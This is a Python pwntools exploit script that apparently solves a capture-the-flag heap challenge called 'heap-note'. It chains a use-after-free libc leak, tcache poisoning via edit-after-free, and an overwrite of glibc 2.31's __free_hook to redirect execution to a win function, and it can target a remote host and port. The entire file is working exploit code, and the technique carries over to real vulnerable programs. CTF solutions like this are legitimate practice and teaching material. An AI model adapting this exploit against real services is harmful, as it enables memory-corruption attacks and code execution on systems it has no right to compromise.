#!/usr/bin/env python3
"""
heap-note solver.

Path:
  1. UAF read: free a large chunk into the unsorted bin, then `view` it to leak
     a libc pointer (the unsorted-bin list head == &main_arena+0x60). Rebase
     libc from the shipped, pinned glibc 2.31.
  2. tcache poisoning via edit-after-free: overwrite a freed 0x20 tcache entry's
     forward pointer with &__free_hook (glibc 2.31 stores it un-mangled -- no
     safe-linking), allocate twice, and write &win into __free_hook.
  3. Trigger any free() -> __free_hook() == win() -> the service prints the
     per-team flag from its environment.

Usage:
  Local:   ./solve.py                      (spawns ./handout/chall under pinned libc)
  Remote:  ./solve.py HOST PORT
"""
import os
import sys
from pwn import *

HERE = os.path.dirname(os.path.abspath(__file__))
HANDOUT = os.path.join(HERE, "..", "handout")

context.arch = "amd64"
context.log_level = "info"

exe = ELF(os.path.join(HANDOUT, "chall"), checksec=False)
libc = ELF(os.path.join(HANDOUT, "libc.so.6"), checksec=False)


def start():
    if len(sys.argv) >= 3:
        return remote(sys.argv[1], int(sys.argv[2]))
    # Local: run the handout binary against the pinned loader + libc, exactly
    # as the service does. We invoke the shipped ld-2.31.so directly and point
    # it at the sibling libc.so.6, so no patchelf is required.
    binpath = os.path.join(HANDOUT, "chall")
    ld = os.path.join(HANDOUT, "ld-2.31.so")
    return process([ld, binpath], env={"LD_LIBRARY_PATH": HANDOUT,
                                       "FLAG": os.environ.get("FLAG", "")})


io = start()


def menu(choice):
    io.recvuntil(b"> ")
    io.sendline(str(choice).encode())


def alloc(idx, size):
    menu(1)
    io.recvuntil(b"index")
    io.sendline(str(idx).encode())
    io.recvuntil(b"size:")
    io.sendline(str(size).encode())


def free(idx):
    menu(2)
    io.recvuntil(b"index")
    io.sendline(str(idx).encode())


def edit(idx, data):
    menu(3)
    io.recvuntil(b"index")
    io.sendline(str(idx).encode())
    io.recvuntil(b"bytes):")
    io.send(data)


def view(idx):
    menu(4)
    io.recvuntil(b"index")
    io.sendline(str(idx).encode())
    io.recvuntil(b"note %d: " % idx)
    return io.recvline(drop=True)


# --- 1. libc leak via UAF read of an unsorted-bin chunk -------------------
alloc(0, 0x500)   # too big for tcache/fastbin -> unsorted bin on free
alloc(1, 0x20)    # guard so chunk 0 is not consolidated into top
free(0)

leaked = u64(view(0)[:8].ljust(8, b"\x00"))
log.info("unsorted head leak: %#x", leaked)

# The lone unsorted chunk's fd/bk point at the unsorted-bin list head,
# which sits at &main_arena+0x60 == __malloc_hook + 0x70 for glibc 2.31/x86-64.
unsorted_head_off = libc.sym["__malloc_hook"] + 0x70
libc.address = leaked - unsorted_head_off
log.success("libc base: %#x", libc.address)
assert libc.address & 0xFFF == 0, "bad libc base -- leak/offset mismatch"

free_hook = libc.sym["__free_hook"]
win = exe.sym["win"]
log.info("__free_hook = %#x   win = %#x", free_hook, win)

# --- 2. tcache poisoning via edit-after-free ------------------------------
alloc(2, 0x18)    # chunk size 0x20, tcache index 0
alloc(3, 0x18)
free(2)
free(3)           # tcache[0x20]: head=3 -> 2   (count=2)

# Edit-after-free: rewrite the freed head's fd to &__free_hook.
edit(3, p64(free_hook).ljust(0x18, b"\x00"))

alloc(4, 0x18)    # returns chunk 3; tcache head becomes __free_hook
alloc(5, 0x18)    # returns a chunk whose user data == __free_hook

# --- 3. write win into __free_hook and trigger ----------------------------
edit(5, p64(win).ljust(0x18, b"\x00"))
free(1)           # free() -> __free_hook(ptr) == win() -> prints flag

io.recvuntil(b"flag: ")
flag = io.recvline(drop=True).decode(errors="replace").strip()
log.success("FLAG: %s", flag)
print(flag)
io.close()
